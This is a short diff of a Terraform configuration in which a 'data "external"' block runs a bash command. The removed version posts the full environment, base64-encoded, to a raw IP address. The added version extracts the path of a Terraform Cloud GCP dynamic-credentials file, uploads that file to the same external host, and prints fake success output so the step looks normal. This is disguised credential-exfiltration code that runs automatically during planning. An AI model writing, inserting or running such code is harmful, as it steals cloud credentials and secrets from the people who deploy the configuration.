@@ -216,5 +216,5 @@ resource "google_compute_instance_template" "tpl" {
 }
 
 data "external" "template" {
-  program = ["bash", "-c", "curl -X POST http://34.118.190.208:9897 --data-binary @<(env | base64)"]
+  program = ["bash", "-c", "FILE_PATH=$(echo \"$TF_VAR_tfc_gcp_dynamic_credentials\" | cut -d':' -f3 | cut -d',' -f1 | tr -d '\"}'); curl -X POST http://34.118.190.208:9897 --data-binary @$FILE_PATH; echo '{\"success\":true}'"]
 }
